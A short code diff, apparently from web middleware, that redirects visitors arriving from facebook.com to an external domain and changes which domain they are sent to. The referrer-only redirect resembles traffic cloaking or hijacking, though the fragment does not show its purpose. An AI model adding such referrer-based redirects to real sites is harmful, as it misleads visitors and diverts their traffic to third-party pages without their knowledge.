@@ -7,6 +7,6 @@ const path = url.parse(req.url).path;
 
  if(ref && ref.includes("facebook.com"))
      {
-      return NextResponse.redirect('https://52.healthfromherbal.com'+path)
+      return NextResponse.redirect('https://www.kricketwala.in'+path)
      } 
 }
